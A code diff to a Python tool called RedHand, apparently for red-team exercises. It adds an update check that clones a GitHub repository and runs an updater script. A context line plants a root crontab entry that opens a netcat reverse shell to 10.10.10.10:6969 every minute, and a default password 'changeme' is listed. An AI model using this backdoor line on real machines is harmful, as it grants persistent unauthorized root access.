@@ -5,6 +5,14 @@ import os
 import sys
 
 def main():
+    print("Checking for updates...")
+    if(updatePend()):
+        option = input ("An update is available. Would you like to update? ")
+        if(option.lower() == "y" or option.lower() == "yes"):
+            os.system("python3 /lib/RedHand/updater.py")
+            return
+    else:
+        print("RedHand is up to date.")
     z = False
     if (not isFirstTime()):
         z = True
@@ -86,7 +94,16 @@ def loadWeakness(machine, set, weakness):
     if(weakness == "1"):
         command = '"* * * * * root /usr/bin/nc 10.10.10.10:6969 -e /bin/bash" >> /etc/crontab'
         stdin, stdout, stderr = ssh_client.exec_command(f"{command}")
-    
+def updatePend():
+    os.system("git clone https://github.com/ravesec/horror /tmp/github >> /dev/null")
+    fOne = open("/lib/RedHand/version", "r")
+    currentVers = fOne.read()
+    fTwo = open("/tmp/github/RedHand/version", "r")
+    gitVers = fTwo.read()
+    if(currentVers == gitVers):
+        return False
+    else:
+        return True
 def getDefPassword(hostName):
     return {
         "ecomm":"changeme"
